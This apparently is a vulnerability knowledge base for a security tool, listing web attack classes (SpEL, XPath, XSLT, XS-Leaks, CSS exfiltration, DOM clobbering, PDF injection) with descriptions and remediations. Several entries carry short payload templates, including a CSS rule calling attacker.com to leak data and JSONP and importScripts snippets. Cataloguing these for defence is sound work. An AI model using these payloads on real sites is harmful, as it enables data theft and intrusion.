description: Expression Language injection in Spring's SpEL allows arbitrary Java method execution via crafted expressions. Attackers can bypass security checks and execute OS commands by chaining class/method access and reflection.
remediation: Disable dynamic SpEL evaluation, use whitelisted expressions, and apply strict input validation.

title: SpEL Remote File Inclusion via File I/O
description: SpEL injection can be leveraged to read arbitrary files by instantiating File and FileInputStream objects within expressions, enabling disclosure of sensitive files.
remediation: Restrict file system access in SpEL, validate paths, and disable dangerous class instantiation.

title: SpEL Local File Inclusion via Path Traversal
description: SpEL expressions can traverse directory structures and read local files when combined with File I/O operations, leading to local file inclusion.
remediation: Sanitize path inputs and restrict file system access in SpEL.

title: SpEL Authorization Bypass via Session Manipulation
description: SpEL can modify session attributes or application state to escalate privileges or bypass authentication checks by setting admin flags or user roles.
remediation: Disable dynamic session manipulation via SpEL and enforce server-side authorization checks.

title: SpEL Server-Side Template Injection
description: SpEL expressions embedded in templates (e.g., Thymeleaf, JSP) can execute arbitrary code when user input is evaluated as part of the template rendering process.
remediation: Use safe templating libraries, disable dynamic expression evaluation, and validate template inputs.

title: SpEL Insecure Direct Object Reference via Expression Evaluation
description: SpEL can be used to manipulate object references or IDs in expressions to access unauthorized data by evaluating expressions that bypass access control checks.
remediation: Enforce strict access control policies and validate object references server-side.

title: Server-Side Template Injection (SSTI) in Jinja2
description: Jinja2 template engine allows code execution via template injection when user input is rendered without proper sandboxing. Attackers can escape the sandbox and execute arbitrary Python code by leveraging accessible global objects and class methods.
remediation: Avoid using user input directly in template rendering; use context variables with strict type checking and disable dangerous globals.

title: Discovering hidden parameters or headers via timing differences
description: Presence of a parameter or header causes a measurable time delay (~5ms) due to server-side checks, DNS lookups, or logging. This hidden attack surface can be uncovered by comparing response times.
remediation: Remove unnecessary checks or logging for unused parameters and headers.

title: Discovering scoped SSRF via timing differences
description: Scoped SSRFs (restricted to allowed IPs/domains) can be detected by timing differences when accessing allowed vs disallowed domains through a reverse proxy. This reveals open proxies even when responses are identical.
remediation: Enforce strict SSRF controls and validate all target domains/IPs.

title: Abusing open proxies to bypass firewalls and discover internal subdomains
description: Open proxies discovered via timing attacks can be abused to access restricted subdomains or internal domains by adding headers like X-Forwarded-For or X-Real-IP, enabling front-end impersonation attacks.
remediation: Disable open proxy functionality and restrict proxy headers.

title: Unicode Injection via normalization or encoding mismatch
description: Attackers inject crafted Unicode characters that are normalized or misinterpreted by the backend, bypassing input filters and enabling further injection attacks such as XSS or SQLi.
remediation: Normalize and validate input in a consistent Unicode encoding before processing.

title: Emoji-triggered XSS via UTF-8/Windows-1252 conversion
description: Servers converting emoji input from Windows-1252 to UTF-8 and then to ASCII can normalize dangerous characters like '<' into exploitable tags.
remediation: Use consistent Unicode encoding and context-aware output escaping.

title: Windows Best-Fit character mapping bypass
description: Windows Best-Fit mapping replaces unsupported Unicode characters with similar ASCII ones, allowing attackers to bypass blacklists and path traversal protections.
remediation: Avoid relying on Best-Fit mappings; use strict Unicode validation.

title: Unicode normalization bypass for SQL injection filters
description: Applications that normalize user input using Unicode (e.g., NFKC/NFKD) after stripping dangerous characters can reintroduce those characters via compatibility equivalence, bypassing input filters and enabling SQL injection.
remediation: Apply normalization before input validation and use parameterized queries.

title: Unicode normalization to bypass XSS filters
description: Malicious Unicode characters that normalize to dangerous ASCII or HTML metacharacters can evade XSS filters when normalization occurs after sanitization.
remediation: Normalize input before output encoding and apply strict CSP.

title: Account or identifier collision via normalization mismatches
description: When different endpoints normalize identifiers differently (e.g., raw vs NFKC), an attacker can register an account with a raw Unicode identifier and later log in using its normalized form, leading to account takeover or privilege escalation.
remediation: Normalize identifiers consistently across all endpoints and use case-insensitive comparisons.

title: Regex bypass via normalization before validation
description: Backend regexes may normalize input for validation but use the original input for processing, allowing attackers to bypass filters while triggering unintended behavior in sinks like Open Redirect or SSRF.
remediation: Normalize input consistently before validation and processing.

title: Cookie prefix confusion via Unicode whitespace
description: Injecting Unicode whitespace before cookie prefixes (e.g., __Host-, __Secure-) can cause servers to misparse cookie names, bypassing security controls like SameSite or Secure flags.
remediation: Strictly validate cookie names and reject non-ASCII whitespace.

title: Windows ANSI conversion of soft hyphen leading to injection
description: On Windows systems using certain code pages, the soft hyphen (U+00AD) converts to a dash (-) during ANSI conversion, enabling argument injection, path traversal, or environment variable manipulation.
remediation: Avoid ANSI conversion paths; use Unicode-aware APIs.

title: Unicode overflow to produce unexpected ASCII characters
description: When Unicode values are truncated or stored in single-byte buffers, crafted code points can overflow into dangerous ASCII characters, bypassing blocklists or validation.
remediation: Use proper Unicode handling and avoid truncation.

title: UUID v1 predictability leading to session/password reset token compromise
description: UUID v1 tokens are generated using time, clock sequence, and MAC address, making them predictable if multiple tokens are captured. Attackers can brute-force tokens between observed values to hijack sessions or reset passwords.
payload_templates: Generate UUIDs between two observed tokens and test reset links
remediation: Use UUID v4 or cryptographically secure random tokens for session/password reset links.

title: Abusing hop-by-hop headers
description: Intermediary proxies may improperly handle hop-by-hop headers, allowing attackers to manipulate request/response processing and potentially bypass security controls.
remediation: Ensure proxies correctly handle hop-by-hop headers and enforce strict header validation.

title: Cross-site WebSocket hijacking (CSWSH)
description: WebSocket handshakes authenticated solely via HTTP cookies without CSRF tokens allow attackers to initiate cross-site connections that inherit the victim's session. This exploits missing CSRF protection in WebSocket session handling.
remediation: Add CSRF tokens to WebSocket handshake requests and enforce SameSite cookie attributes.

title: Server-side prototype pollution via WebSocket/Socket.IO
description: Malicious payloads sent via WebSocket/Socket.IO messages can pollute server-side JavaScript prototypes, potentially leading to remote code execution or unintended behavior if prototype pollution gadgets exist.
remediation: Sanitize and validate all WebSocket/Socket.IO input, avoid dynamic property access, and use Object.freeze() on prototypes.

title: WebSocket race condition via Turbo Intruder
description: Concurrent WebSocket messages processed in parallel can trigger race conditions, enabling attacks like double-spend, token reuse, or state desynchronization due to improper synchronization.
payload_templates: THREADED engine in Turbo Intruder with concurrent payloads
remediation: Implement proper locking mechanisms and atomic operations for state-changing WebSocket operations.

title: WebSocket DoS via malformed Ping frame
description: Crafting WebSocket frames with an exaggerated payload length header can cause server-side buffer over-allocation, leading to out-of-memory errors and denial of service.
remediation: Validate and sanitize WebSocket frame headers, enforce reasonable payload size limits.

title: XPath Injection Authentication Bypass
description: Exploits XPath queries to bypass authentication by injecting boolean conditions that always evaluate to true, such as ' or '1'='1' or null injection.
remediation: Use parameterized queries or input validation for XPath expressions.

title: XPath Injection String Extraction
description: Abuses XPath queries to extract sensitive data such as usernames and passwords by manipulating XPath predicates.
remediation: Sanitize user input and use safe XPath query construction.

title: Blind XPath Injection
description: Exploits XPath queries where error messages or timing differences reveal information about the XML document structure or content.
remediation: Use parameterized queries and disable error messages.

title: Out-of-Band XPath Injection
description: Exploits XPath queries to exfiltrate data via external network requests by leveraging functions like doc() or doc-available().
oracle_hints: external HTTP requests to attacker server
remediation: Disable external document access in XPath functions and sanitize inputs.

title: XPath Injection Schema Discovery
description: Uses XPath queries to infer the structure of an XML document by counting nodes and comparing names.
remediation: Restrict XPath query capabilities and validate inputs.

title: XS-Leak via onerror/onload event handlers
description: Exploits onerror/onload event handlers to infer cross-origin resource loading status by observing whether a resource loads successfully or fails, revealing HTTP status codes or content differences.
remediation: Implement proper CORS policies, avoid exposing sensitive status codes, and use anti-XS-Leak headers like X-Frame-Options and Content-Security-Policy.

title: XS-Leak via Content-Type/CORB script load oracle
description: Uses <script> tags to load endpoints that return HTML (triggers onload) vs JSON (CORB-blocked, triggers onerror), enabling brute-forcing of identifiers like user IDs within a known scope.
remediation: Ensure endpoints return consistent Content-Type headers and avoid exposing sensitive data via script inclusion.

title: XS-Leak via postMessage vs X-Frame-Options oracle
description: Brute-forces account IDs by leveraging postMessage events and X-Frame-Options headers; if framing is denied, no message is emitted, allowing state inference.
remediation: Avoid relying on postMessage for sensitive state checks and enforce strict X-Frame-Options headers.

title: XS-Leak via onload timing differences
description: Measures time taken for cross-origin resource loading using performance.now() or other clocks to infer page state based on timing disparities caused by content size or status codes.
payload_templates: const start = performance.now(); fetch('//example.com/resource').then(() => { const end = performance.now(); console.log(end - start); });
remediation: Normalize response times and avoid exposing sensitive information via timing side channels.

title: XS-Leak via unload/beforeunload timing
description: Uses unload/beforeunload events to measure time taken for cross-origin resource fetching, exploiting timing differences to infer page state or content.
payload_templates: window.addEventListener('beforeunload', () => { start = performance.now(); }); window.addEventListener('unload', () => { end = performance.now(); console.log(end - start); });
remediation: Avoid exposing sensitive state via timing side channels and use constant-time responses.

title: XS-Leak via sandboxed frame timing
description: Exploits timing differences in sandboxed iframe loading to infer cross-origin page state, leveraging performance APIs or other clocks to measure delays.
remediation: Avoid relying on timing for sensitive state checks and use anti-XS-Leak headers.

title: Connection Pool Timing Side-Channel via Socket Blocking
description: Abuse browser connection pooling to infer content presence by measuring request timing after blocking sockets. Exploits resource contention between attacker-injected HTML and controlled requests.
remediation: Implement strict CSP, disable connection pooling for sensitive content, and enforce resource limits.

title: CSRF to Create Malicious Posts with HTML Injection
description: Abuse missing CSRF tokens to force victims to create posts containing attacker-controlled HTML. Used as a source for XS-Leak exploitation.
remediation: Add anti-CSRF tokens to state-changing endpoints.

title: CSRF to Delete Posts by Index
description: Abuse missing CSRF tokens to force victims to delete posts at specific indices, enabling ordering-based side-channel attacks.
remediation: Add anti-CSRF tokens to state-changing endpoints.

title: Cookie Bomb + Onerror XS-Leak
description: Abuse excessive cookies to trigger server-side limits (431/414/400) and use onerror/onload events as a cross-site leak oracle. Works by inflating request headers/URLs to force error responses that distinguish states.
remediation: Enforce strict header/URL length limits and avoid branching logic based on client-controlled data.

title: CSS Attribute Selector Injection
description: Crafted CSS selectors can exfiltrate input values by loading external resources when attribute conditions match. Hidden inputs can be targeted via sibling combinators.
remediation: Sanitize user-controlled input embedded in CSS and enforce strict CSP.

title: Blind CSS Attribute Selector Exfiltration
description: Uses :has and :not selectors to identify and exfiltrate content from blind elements without prior knowledge of page content.
remediation: Sanitize user-controlled input embedded in CSS and enforce strict CSP.

title: CSS @import-based Exfiltration Loop
description: Abuses CSS @import to load attacker-controlled CSS that iteratively leaks secret characters via attribute selectors, minimizing required victim interactions.
remediation: Disable external @import in CSS or enforce strict CSP.

title: Inline-Style CSS Exfiltration via attr() and if()
description: Uses CSS custom properties, attr(), if() conditionals, and image-set() to exfiltrate attribute values via inline styles without external stylesheets.
remediation: Sanitize inline style attributes and enforce CSP.

title: Error-based XS-Search via CSS @font-face unicode-range
description: Abuses @font-face and unicode-range to leak cross-origin resource load status via font rendering differences.
payload_templates: @font-face { font-family: poc; src: url(http://attacker.com/?leak); unicode-range: U+0041; }
remediation: Disable external font loading or enforce strict CSP.

title: Scroll-to-Text Fragment CSS Injection
description: Uses :target pseudo-class to confirm presence of specific text on a page by triggering resource loads via injected CSS.
remediation: Sanitize user-controlled input embedded in CSS and enforce strict CSP.

title: CSS injection via @import leading to data exfiltration
description: Injecting a malicious @import rule in CSS allows an attacker to exfiltrate sensitive data by forcing the browser to make requests to an attacker-controlled server. The technique abuses CSS attribute selectors and CSS custom properties to leak data character-by-character.
remediation: Sanitize user-controlled input embedded in CSS and avoid dynamic @import rules from untrusted sources.

title: LESS Code Injection via @import (inline) leading to Local File Read
description: When user-controlled input is embedded in a LESS stylesheet processed by the LESS compiler, an attacker can inject `@import (inline) 'file:///path'` to read arbitrary local files. The `(inline)` option fetches and embeds the file contents into the resulting CSS.
remediation: Sanitize user input embedded in LESS stylesheets and avoid dynamic compilation with user-controlled data.

title: LESS Code Injection via @import (inline) leading to SSRF
description: By injecting `@import (inline) 'http://<internal-ip>'` into a LESS stylesheet, an attacker can force the server to fetch internal resources, including cloud metadata endpoints like AWS IMDS.
remediation: Sanitize user input embedded in LESS stylesheets and disable outbound requests from the LESS compiler.

title: Lazy image timing side channel via event loop blocking
description: Exploits lazy-loaded image fetch timing to create a Boolean oracle when direct observation is blocked by CSP or restrictions. Uses event loop contention to measure delays caused by image loading.
remediation: Disable lazy loading for sensitive content or implement strict CSP to block external resource timing.

title: XS-Leak via JavaScript execution oracle
description: An XS-Leak primitive that turns whether a cross-origin response executes as JavaScript into a Boolean oracle. The attacker uses a classic script inclusion to observe if a callback fires, leaking sensitive content based on execution differences.
remediation: Avoid reflecting attacker-controlled input into executable JavaScript contexts; use CSP and proper MIME types.

title: XS-Leak via performance.now() and heavy task timing
description: An attacker measures the time taken to load a resource to infer whether a secret string (e.g., a flag) exists in a response. By forcing heavy tasks and comparing timing differences, sensitive data can be leaked.
remediation: Disable cross-origin resource timing or implement strict timing side-channel protections.

title: XS-Leak via onerror/onload event handlers
description: Exploits onerror/onload event handlers to infer cross-origin resource loading success/failure by observing status codes or content differences. Works with frames, scripts, stylesheets, images, and other HTML elements.
remediation: Implement Cross-Origin Resource Policy (CORP) and disable framing via X-Frame-Options/Content-Security-Policy.

title: XS-Leak via onload timing differences
description: Measures time differences in onload events using performance.now() or other clocks to infer cross-origin resource states based on timing variations.
remediation: Use Cross-Origin Resource Policy (CORP) and disable timing APIs via Permissions-Policy.

title: XS-Leak via unload/beforeunload timing
description: Exploits unload/beforeunload events to measure cross-origin resource fetch duration using SharedArrayBuffer or other high-resolution clocks.
remediation: Disable SharedArrayBuffer and restrict unload/beforeunload event access via Permissions-Policy.

title: XS-Leak via sandboxed iframe timing
description: Measures network timing of cross-origin resources loaded in sandboxed iframes where JavaScript execution is restricted, isolating network performance differences.
remediation: Enforce Cross-Origin Resource Policy (CORP) and disable sandboxed iframe timing via Permissions-Policy.

title: XSLT Server-Side Request Forgery via document() or include
description: XSLT processors allow stylesheets to fetch remote resources via functions like document() or via xsl:include/xsl:import. Attackers can abuse this to probe internal networks or exfiltrate data.
oracle_hints: HTTP request received by internal service
remediation: Disable external document fetching in XSLT processor configuration and restrict network access.

title: XSLT Local File Inclusion via unparsed-text() or php:function()
description: XSLT processors expose functions such as unparsed-text() and PHP extension functions that can read arbitrary local files when external access is enabled.
remediation: Disable file access functions in XSLT processor configuration and sanitize stylesheet inputs.

title: XSLT XXE via external entity expansion in stylesheet
description: XSLT stylesheets can still trigger XXE even when the input XML parser is hardened, because the XSLT processor may parse entities during transformation.
remediation: Disable DTD and external entity processing in XSLT processor settings.

title: XSLT Remote Code Execution via extension functions
description: XSLT processors allow calling extension functions (e.g., Java/C# methods) when external functions are enabled, leading to arbitrary code execution.
remediation: Disable extension functions and restrict external function calls in XSLT processor configuration.

title: XSLT Cross-Site Scripting via script injection
description: XSLT stylesheets can inject arbitrary JavaScript into the generated HTML output when user-controlled content is rendered without proper escaping.
remediation: Apply HTML escaping to all dynamic content in XSLT output.

title: Reflected Cross-Site Scripting (XSS)
description: Occurs when user-controlled input is reflected in the HTML response without proper sanitization, allowing execution of arbitrary JavaScript in the victim's browser.
remediation: Sanitize all user inputs using context-aware encoding libraries before rendering.

title: Stored Cross-Site Scripting (XSS)
description: Occurs when user-controlled input is stored on the server and later reflected in responses, enabling persistent execution of arbitrary JavaScript.
remediation: Sanitize all user inputs before storage and rendering using context-aware encoding.

title: DOM-based Cross-Site Scripting (XSS)
description: Occurs when JavaScript in the page processes user-controlled data unsafely, allowing execution of arbitrary code in the DOM context.
remediation: Use safe DOM manipulation methods and avoid unsafe sinks like innerHTML.

title: Client-Side Template Injection (CSTI)
description: Occurs when user-controlled data is embedded in client-side templates without proper escaping, enabling arbitrary JavaScript execution.
remediation: Use safe template engines with auto-escaping or sandboxed execution.

title: Dangling Markup - HTML Scriptless Injection
description: Exploits markup injection without direct JavaScript execution, often used to exfiltrate data via external resources.
remediation: Implement strict input validation and output encoding.

title: JavaScript Function Execution via Callback Parameter
description: Occurs when user-controlled input is used as a function name in JavaScript callbacks, enabling execution of arbitrary functions.
remediation: Validate and sanitize callback parameters to prevent arbitrary function execution.

title: XSS in HTML Tag Attributes
description: Occurs when user-controlled input is reflected inside HTML tag attributes without proper escaping, enabling event handler injection or protocol handlers.
remediation: Context-aware output encoding for attribute values.

title: XSS Inside JavaScript Code Blocks
description: Occurs when user-controlled input is reflected inside JavaScript code blocks without proper escaping, enabling code injection.
remediation: Properly escape JavaScript strings and avoid dynamic code generation.

title: Abusing Service Workers via XSS to register malicious SW
description: Attackers can register a malicious service worker via XSS to intercept and exfiltrate all fetch requests within the domain. The malicious SW can be loaded from an uploaded JS file or a vulnerable JSONP response.
remediation: Implement strict CSP, sanitize inputs, and set short TTL for service workers.

title: Abusing importScripts in Service Worker via DOM Clobbering
description: An attacker can manipulate the importScripts parameter in a service worker to load arbitrary scripts from external domains, bypassing CSP protections. This can be achieved via DOM Clobbering if the parameter is derived from a controllable HTML element.
payload_templates: const searchParams = new URLSearchParams(location.search); let host = searchParams.get("host"); self.importScripts(host + "/sw_extra.js")
remediation: Validate and sanitize all inputs used in importScripts calls.

title: Disk cache fallback to XSS via history navigation
description: An attacker primes a victim's browser to cache attacker-controlled bytes under a stable URL, then forces a history navigation that disables bfcache and falls back to disk cache. The cached bytes are later rendered/executed as a document due to a second primitive like HTML injection or CSP bypass.
remediation: Ensure sensitive responses are not cached or served as executable content; use Cache-Control: no-store for pages that must not be cached.

title: DOM Clobbering via id and name attributes
description: Global JavaScript variables can be overwritten by HTML elements using id or name attributes, enabling XSS or logic manipulation. Certain elements (embed, form, iframe, image, img, object) can clobber globals via name.
remediation: Avoid relying on DOM-provided globals; use explicit object initialization.

title: DOM Clobbering of arrays and object attributes
description: Arrays and nested object attributes can be clobbered using nested HTML elements with id/name attributes, allowing attacker-controlled property access.
remediation: Sanitize and validate DOM-provided data before property access.

title: DOM Clobbering via iframes and srcdoc
description: Deep attribute clobbering is possible using nested iframes with srcdoc, enabling control over deeply nested object properties.
remediation: Avoid using untrusted HTML in srcdoc; enforce CSP.

title: DOM Clobbering to bypass attribute filters
description: Clobbering DOM properties like attributes, tagName, nodeName, or parentNode can bypass filters that iterate over node properties.
remediation: Do not rely on node property values for security checks; use explicit validation.

title: DOM Clobbering of window.someObject
description: Overriding window.someObject with a DOM node can introduce XSS by controlling script sources or event handlers.
remediation: Initialize objects explicitly; avoid using DOM nodes for object properties.

title: DOM Clobbering of document object attributes
description: Document object attributes like document.cookie, document.body, or document.querySelector can be clobbered using img, form, or other elements.
remediation: Avoid using document properties that can be clobbered; use explicit references.

title: DOM Clobbering via injected html/body tags
description: Injecting <html> or <body> tags with matching id attributes can alter results of document.getElementById and document.querySelector.
remediation: Sanitize HTML input; avoid using id-based lookups for sensitive operations.

title: DOM Clobbering using SVG body tags
description: Using <body> tags inside SVG or <foreignobject> can clobber elements by id, affecting DOM queries.
remediation: Restrict SVG content; sanitize HTML and SVG input.

title: DOM Clobbering via form attributes to inject content
description: Adding new entries or buttons to forms via form attribute in textarea or button elements can inject malicious content or trigger unintended actions.
remediation: Validate and sanitize form inputs; avoid dynamic form attribute usage.

title: DOM-based Cross-Site Scripting (DOM XSS)
description: DOM Invader identifies client-side JavaScript sinks where user-controlled data is processed without proper sanitization, enabling execution of arbitrary scripts in the context of the vulnerable page.
remediation: Apply context-aware output encoding and use safe DOM manipulation methods like textContent instead of innerHTML.

title: Client-Side Prototype Pollution
description: DOM Invader detects prototype pollution sources where user input is merged into Object.prototype, potentially allowing attackers to inject properties that are later used in dangerous sinks like eval or innerHTML.
remediation: Avoid merging user input into Object.prototype; use Object.create(null) for safe objects and validate property names.

title: DOM Clobbering via id/name collisions
description: DOM Invader monitors dynamically created elements where id or name attributes overwrite global variables or form objects, potentially leading to unintended behavior or security bypasses.
remediation: Avoid using user-controlled values for id/name attributes; use unique prefixes or namespaces.

title: Insecure postMessage Handling
description: DOM Invader logs and allows manipulation of postMessage events, identifying cases where message data is used without proper origin or source validation, enabling cross-origin attacks.
remediation: Validate event.origin and event.source strictly; avoid using event.data directly in sinks.

title: DOM-based Open Redirect
description: DOM-based open redirect occurs when attacker-controlled data is written to a sink that can initiate navigation, such as location.href or window.open(). This can lead to phishing or user redirection to malicious sites.
remediation: Validate and sanitize all user-controlled input before using it in navigation sinks; use allowlists for permitted domains.

title: DOM-based JavaScript Injection
description: DOM-based JavaScript injection occurs when attacker-controlled data is passed to dangerous JavaScript execution sinks like eval() or Function(). This can lead to arbitrary code execution in the victim's browser.
remediation: Avoid using eval() and Function() with user-controlled input; use safer alternatives like JSON.parse() for data parsing.

title: DOM-based Data Manipulation leading to XSS
description: DOM-based data manipulation occurs when attacker-controlled data is written to DOM properties like innerHTML, outerHTML, or textContent without proper sanitization, enabling script execution via malicious markup.
remediation: Sanitize all user-controlled input before rendering into DOM; use DOMPurify or similar libraries.

title: DOM-based jQuery Injection
description: DOM-based jQuery injection occurs when attacker-controlled data is passed to jQuery methods like html(), append(), or before(), enabling script execution via malicious markup or event handlers.
remediation: Avoid using jQuery methods that interpret strings as HTML; use text() for user-controlled content.

title: Client-side SQL Injection via DOM
description: Client-side SQL injection occurs when attacker-controlled data is passed to client-side SQL execution functions like executeSql(), enabling SQL query manipulation and potential data exfiltration.
remediation: Use parameterized queries and avoid dynamic SQL construction with user input.

title: DOM-based HTML5 Storage Manipulation
description: DOM-based HTML5 storage manipulation occurs when attacker-controlled data is stored in or retrieved from localStorage or sessionStorage without proper validation, enabling data tampering or injection attacks.
remediation: Validate and sanitize data before storing in or reading from HTML5 storage.

title: DOM-based Cookie Manipulation
description: DOM-based cookie manipulation occurs when attacker-controlled data is written to document.cookie, enabling session hijacking or other attacks via malicious cookie values.
remediation: Avoid writing user-controlled data directly to document.cookie; use HttpOnly and Secure flags.

title: DOM-based Web Message Manipulation
description: DOM-based web message manipulation occurs when attacker-controlled data is passed via postMessage() without proper origin validation, enabling cross-origin script injection.
remediation: Validate the origin of postMessage events before processing the data.

title: DOM-based WebSocket URL Poisoning
description: DOM-based WebSocket URL poisoning occurs when attacker-controlled data is used to construct a WebSocket URL, enabling SSRF or connection to malicious endpoints.
remediation: Validate and sanitize WebSocket URLs; restrict to trusted domains.

title: XSS via srcdoc iframe injection
description: Injecting attacker-controlled HTML into an iframe's srcdoc attribute grants DOM access to the parent document when sandboxing is not applied, enabling XSS even under restrictive CSP.
remediation: Apply CSP with script-src directives and avoid allowing same-origin in sandboxed iframes.

title: XSS via data: protocol iframe
description: Using the data: protocol in an iframe's src attribute allows execution of attacker-controlled JavaScript bypassing CSP restrictions.
remediation: Restrict data: URIs in CSP and avoid allowing data: in script-src.

title: Same-origin iframe DOM access bypass
description: Same-origin iframes can access parent DOM variables and execute scripts, enabling XSS even when CSP restricts inline scripts.
remediation: Use sandbox attributes with allow-same-origin cautiously and enforce strict CSP.

title: CSP bypass via same-origin JSONP endpoint in iframe
description: Abusing a same-origin JSONP endpoint loaded in an iframe allows execution of attacker-controlled JavaScript even under CSP with script-src 'none'.
remediation: Disable JSONP endpoints or restrict their usage with CSP frame-src directives.

title: Dangling-markup iframe data exfiltration
description: Injecting a dangling iframe name attribute allows exfiltration of sensitive tokens via window.name after navigating to about:blank, bypassing CSP restrictions.
remediation: Sanitize user input and avoid reflecting untrusted data in HTML attributes.

title: CSP nonce reuse via same-origin iframe
description: Reusing CSP nonces from the parent document in a same-origin iframe allows minting trusted script elements even under strict-dynamic.
remediation: Avoid allowing same-origin iframes and enforce strict CSP with unique nonces.

title: Form-action hijacking via iframe
description: Omitting form-action in CSP allows re-targeting of forms from injected iframes, enabling credential theft via password managers.
remediation: Include form-action in CSP and avoid injection points.

title: Sandbox attribute privilege escalation
description: Granting both allow-scripts and allow-same-origin in sandboxed iframes allows removal of sandbox restrictions and DOM access to parent, enabling privilege escalation.
remediation: Avoid granting allow-same-origin in sandboxed iframes.

title: Credentialless iframe storage and DOM leakage
description: Credentialless iframes share the same top-level origin and DOM, allowing multi-iframe self-XSS attacks and storage leakage despite credential stripping.
remediation: Avoid relying on credentialless iframes for isolation; use COOP+COEP.

title: Integer overflow in WebP decoder leading to heap corruption
description: A malformed WebP image caused an integer overflow in the lossless Huffman decoder, leading to heap corruption and potential remote code execution in Chromium-based browsers.
payload_templates: malformed WebP with crafted Huffman tables
remediation: Apply vendor patches and validate WebP metadata before processing.

title: Integer overflow in Chrome Layout rendering pipeline
description: An integer overflow in Chrome's layout engine allowed out-of-bounds memory writes from crafted HTML/CSS, leading to potential heap corruption.
payload_templates: crafted HTML/CSS with extreme numeric values
remediation: Update Chrome to the latest version and sanitize input values.

title: Integer overflow in Chrome Skia graphics stack
description: An integer overflow in the Skia graphics library allowed out-of-bounds writes when processing crafted HTML content, enabling potential memory corruption.
payload_templates: crafted HTML with extreme numeric values
remediation: Patch Chrome and validate all numeric inputs in graphics processing.

title: Integer overflow in PHP price calculation logic
description: A 32-bit integer overflow in PHP price calculation allowed bypassing validation checks by sending extreme values, leading to incorrect financial logic.
remediation: Use 64-bit integers or checked arithmetic for financial calculations.

title: Integer truncation leading to DOM XSS via bitwise operations
description: Bitwise truncation of attacker-controlled integers in client-side JavaScript led to incorrect length checks and DOM XSS via malformed input.
remediation: Avoid bitwise truncation; validate and sanitize inputs before DOM operations.

title: Integer truncation at JS-WASM boundary leading to memory corruption
description: Integer values normalized in JavaScript and passed to WASM were truncated differently, causing memory corruption or incorrect buffer operations.
remediation: Use consistent integer types and validate ranges before passing to WASM.

title: JavaScript Hoisting to bypass exception handling in RXSS
description: By declaring a missing identifier via hoisting before an exception handler, an attacker can execute malicious JavaScript before a ReferenceError is thrown, bypassing exception-based XSS filters.
remediation: Avoid using user input in dynamic code execution contexts; sanitize and validate all inputs.

title: Preempt later declarations by locking a name with const in RXSS
description: Declaring a lexical binding with the same name as a later function using const prevents the function from overriding the binding, enabling RXSS by hijacking critical handlers.
remediation: Avoid using user-controlled values in global scope declarations; use strict scoping and input validation.

title: Dynamic import() with user-controlled specifiers leading to RCE
description: User-controlled module specifiers in dynamic import() statements can be abused via hoisting to execute attacker-controlled code before subsequent lines, enabling remote code execution in server-side rendered applications.
remediation: Sanitize and validate all user-controlled input used in dynamic import() specifiers; avoid using user input in module resolution.

title: PDF JavaScript injection via object/action breakout
description: Injecting PDF objects or actions to execute JavaScript when a PDF is opened or interacted with. Breaks out of reflected strings/dictionaries to append malicious /JS, /OpenAction, or /AA entries.
remediation: Escape parentheses and backslashes; use hex strings for untrusted data; strip dangerous PDF keys like /OpenAction and /AA.

title: PDF.js FontMatrix arbitrary JavaScript execution
description: Crafted Type1 font object in PDF.js injects JavaScript via FontMatrix string into c.transform(), achieving arbitrary JS execution in PDF.js context.
remediation: Update PDF.js to versions patched for CVE-2024-4367.

title: jsPDF addJS() PDF object injection
description: jsPDF addJS() wraps attacker-controlled JavaScript inside /JS without proper escaping, allowing injection of additional PDF objects/actions.
remediation: Sanitize input passed to addJS() and escape PDF syntax.

title: PDF SSRF via form submission or URI actions
description: Injecting /URI or widget actions to trigger outbound HTTP requests to internal or external servers, enabling SSRF or blind data exfiltration.
remediation: Validate and sanitize URI values; restrict outbound connections.

title: PDF content theft via Acrobat JavaScript APIs
description: Using Acrobat JavaScript APIs like getPageNthWord() to enumerate and exfiltrate document content via JavaScript execution.
remediation: Disable JavaScript execution in PDF viewers; restrict sensitive API access.

title: Server-Side XSS via Dynamic PDF Generation
description: When user-controlled input is rendered into a PDF by a server-side component, the PDF engine may interpret HTML/JS tags, leading to arbitrary JavaScript execution on the server. This can result in data exfiltration or further exploitation.
remediation: Sanitize all user input used in PDF generation and disable JavaScript execution in the PDF engine.

title: SSRF via PDF Generation Engine
description: Malicious input in PDF generation can force the server to make arbitrary HTTP requests to internal or external systems, enabling port scanning, metadata access, or internal service interaction.
remediation: Restrict outbound HTTP requests from the PDF generation process and validate all URLs.

title: Local File Inclusion via PDF Generation
description: User input in PDF generation can be abused to read arbitrary local files on the server by leveraging file:// URLs or PDF attachment features.
remediation: Disable file:// URL access in the PDF engine and sanitize input paths.

title: Same Origin Method Execution (SOME) via callback parameter
description: Abuse a controllable callback parameter in a same-origin page to execute arbitrary JavaScript via the opener object. The attacker tricks the victim into opening a malicious page that leverages the opener reference to trigger sensitive actions in the original page.
remediation: Sanitize and validate callback parameters; avoid dynamic script injection.

title: WASM linear memory corruption leading to DOM XSS via template overwrite
description: A memory-corruption bug in a WebAssembly module compiled with Emscripten can overwrite constant HTML templates stored in linear memory. When these templates are later used to build DOM content, sanitized input becomes executable JavaScript.
remediation: Store HTML templates in read-only memory, validate buffer lengths before writes, and sanitize at the sink.

title: XSS via injected HTML tags in Markdown
description: Markdown parsers that accept raw HTML allow injection of script tags and event-handler attributes to execute JavaScript.
remediation: Strip or sanitize HTML tags before passing content to the markdown parser.

title: XSS via javascript: links in Markdown
description: Markdown link syntax can be abused to execute JavaScript via javascript: URIs when user clicks the link.
remediation: Sanitize href attributes and block javascript: scheme in markdown links.

title: XSS via img event syntax abuse in Markdown
description: Malformed image tags in markdown can inject event handlers such as onerror or onload to trigger JavaScript execution.
remediation: Strictly validate and sanitize image tag attributes in markdown.

title: XSS via Markdown–DOMPurify misinterpretation
description: When HTML is sanitized then parsed as markdown, mismatches between sanitizer and parser can allow XSS payloads to bypass filters.
remediation: Use a single, consistent sanitizer for both HTML and markdown rendering paths.

title: XSS via gopher scheme in Markdown
description: Markdown image links using the gopher scheme can trigger SSRF-like requests to internal services, potentially leaking data or enabling XSS.
remediation: Block gopher and other non-HTTP schemes in markdown links.

title: Static JavaScript XSSI via script tag inclusion
description: Private data embedded in globally accessible JavaScript files can be leaked by including the script in malicious content. The Same-Origin Policy does not block script inclusion across domains, enabling unauthorized data access.
remediation: Avoid embedding sensitive data in JavaScript files; use secure data transmission methods.

title: Dynamic JavaScript XSSI via authenticated requests
description: Confidential information dynamically added to JavaScript in authenticated responses can be leaked by comparing requests with and without cookies. Attackers exploit differences to extract sensitive data.
payload_templates: var angular = function() { return 1 }; angular.callbacks._7 = function(leaked) { alert(JSON.stringify(leaked)) }
